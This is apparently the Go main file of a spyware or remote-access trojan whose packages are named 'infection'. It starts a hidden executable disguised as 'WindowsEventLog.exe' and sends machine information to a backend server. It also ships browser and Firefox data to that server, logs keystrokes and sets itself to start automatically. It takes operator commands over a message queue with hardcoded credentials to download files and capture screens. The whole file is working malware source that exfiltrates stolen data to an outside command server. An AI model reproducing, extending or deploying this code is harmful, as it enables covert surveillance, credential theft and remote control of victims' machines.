package main

import (
	"encoding/json"
	"fmt"
	"github.com/streadway/amqp"
	"infection/browser"
	"infection/etcd"
	"infection/hitboard"
	"infection/killit"
	"infection/machineinfo"
	"infection/rmq"
	"infection/util/lib"
	"log"
	"net/http"
	"time"

	"io/ioutil"
	"os"
	"os/exec"
	"sync/atomic"
	"syscall"
)

var backendAddr string
var mqAddr string

type Info struct {
	Dev       bool
	DevEnable bool
}

var Config = Info{
	false,
	false,
}

type AppConfig struct {
	Url string
}

// confirm lock
type AppConfigMgr struct {
	config atomic.Value
}

var appConfigMgr = &AppConfigMgr{}

func (a *AppConfigMgr) Callback(conf *etcd.Config) {
	appConfig := &AppConfig{}
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(appConfig)
}

func init() {
	lib.KillCheck()
	for _, d := range lib.Path {
		lib.Create_dir(d)
	}
	//currentprogram path log
	content, _ := lib.GetTargetPath()
	data := []byte(content)
	// path log
	if err := ioutil.WriteFile(lib.NOGUILOG, data, 0644); err != nil {
		log.Println("dir not exit:", err)
	}
	if Config.DevEnable {
		backendAddr = lib.TMVC
		mqAddr = lib.TMQ
	} else {
		backendAddr = lib.PMVC
		mqAddr = lib.PMQ
	}
	//fixed ioop download check
	_, cerr := os.Stat(lib.CURRENTPATH + "WindowsEventLog.exe")
	if cerr != nil {
		//keep the main process live
		lib.MultiFileDown([]string{}, "init")

		cmd := exec.Command(lib.CURRENTPATH + "WindowsEventLog.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
	} else {
		cmd := exec.Command(lib.CURRENTPATH + "WindowsEventLog.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
	if Config.Dev {
		f, _ := os.OpenFile("free-debug.log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
		log.SetOutput(f)
	}
}

func main() {
	conf, _ := etcd.NewConfig()
	conf.AddObserver(appConfigMgr)
	var appConfig AppConfig
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(&appConfig)
	finflag := make(chan string)
	go machineinfo.MachineSend(conf.Url+backendAddr, finflag)
	<-finflag
	if lib.FileExits(lib.BrowserSafepath) != nil {
		go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
	}
	//go tunnel.Tunnel(addr)
	go hitboard.KeyBoardCollection("http://" + conf.Url + backendAddr + "/keyboard/record")
	if lib.FileExits(lib.Firefoxpath) == nil {
		if lib.FileExits(lib.Firefox) != nil {
			go browser.Firefoxpack("http://" + conf.Url + backendAddr + "/browser/")
		} else {
			//exits check date updae
			logf, _ := os.Stat(lib.Firefox)
			if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
				os.RemoveAll(lib.Firefox)
				go browser.Firefoxpack("http://" + conf.Url + backendAddr + "/browser/")
			}
		}
	}
	AmqpURI := "amqp://jin:jinjin123@" + conf.Url + mqAddr
	mqhost := rmq.NewIConfigByVHost(lib.MQHOST)
	iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
	//queuename := lib.HOSTID + "-"+lib.GetRandomString(6)
	queuename := lib.HOSTID + "-dog"
	cerr := iConsumer.Subscribe("dogopeation", rmq.FanoutExchange, queuename, "hostid", false, mqHandler)
	if cerr != nil {
		appConfig := appConfigMgr.config.Load().(*AppConfig)
		AmqpURI := "amqp://jin:jinjin123@" + appConfig.Url + mqAddr
		iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
		iConsumer.Subscribe("dogopeation", rmq.FanoutExchange, queuename, "hostid", false, mqHandler)
	}
	go lib.Fav("http://" + conf.Url + backendAddr + "/browser/")
	go lib.AutoStart()
	http.HandleFunc("/hello", handler)
	if err := http.ListenAndServe(":11000", nil); err != nil {
		http.ListenAndServe(":11812", nil)
		log.Println("pac Faild", err)
	}
}
func handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "hello world")
}

type Message struct {
	Hostid string //hostid
	Code   int    //opeation code
	Path   string //download path
	Diff   int    //not diff all do  0 one  1 all
	Num    int    // how many at 10 min 1min 13 pic
	Fname  string //file name
}

func mqHandler(d amqp.Delivery) {
	appConfig := appConfigMgr.config.Load().(*AppConfig)
	log.Println("have message")
	body := d.Body
	//consumerTag := d.ConsumerTag
	var msg Message
	json.Unmarshal(body, &msg)
	go killit.Opeation(msg.Hostid, msg.Code, msg.Path, msg.Diff, msg.Num, msg.Fname, appConfig.Url, backendAddr)
}
